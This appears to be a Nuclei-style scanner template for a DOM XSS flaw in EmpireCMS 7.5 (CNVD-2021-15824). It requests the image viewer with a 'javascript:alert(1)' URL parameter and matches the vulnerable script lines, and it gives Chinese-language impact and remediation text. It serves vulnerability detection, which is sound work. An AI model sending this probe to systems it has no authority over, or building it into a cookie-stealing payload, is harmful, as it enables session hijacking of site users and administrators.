id: CNVD-2021-15824

info:
  name: EmpireCMS 7.5 DOM 型 XSS 漏洞（CNVD-2021-15824）
  author: daffainfo,pikpikcu
  severity: high
  description: |
    EmpireCMS 7.5 的图片查看页面对 `url` 参数处理不当，存在 DOM 型 XSS 风险。模板请求 `e/ViewImg/index.html?url=javascript:alert(1)`，并匹配页面中将参数写入链接的脚本逻辑确认漏洞。
  impact: |
    - 攻击者可诱导用户访问恶意链接，在受害者浏览器中执行脚本，窃取 Cookie 或发起钓鱼操作。
    - 若管理员访问被构造页面，可能导致后台会话被盗用或内容管理权限被滥用。
  remediation: |
    - 升级 EmpireCMS 至修复版本，修复图片查看页面对 URL 参数的输出处理。
    - 对用户可控 URL 进行协议白名单校验，禁止 `javascript:` 等危险协议。
    - 对写入 HTML、属性和脚本上下文的数据分别进行正确编码，并启用 CSP 降低 XSS 影响。
  reference:
    - https://sourceforge.net/projects/empirecms/
    - https://www.bilibili.com/read/cv10441910
    - https://vul.wangan.com/a/CNVD-2021-15824
    - https://github.com/leadscloud/EmpireCMS/issues/4
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-79
  metadata:
    max-request: 1
  tags: cnvd2021,cnvd,empirecms,xss,domxss,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/e/ViewImg/index.html?url=javascript:alert(1)"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'if(Request("url")!=0)'
          - 'href=\""+Request("url")+"\"'
        condition: and

      - type: status
        status:
          - 200
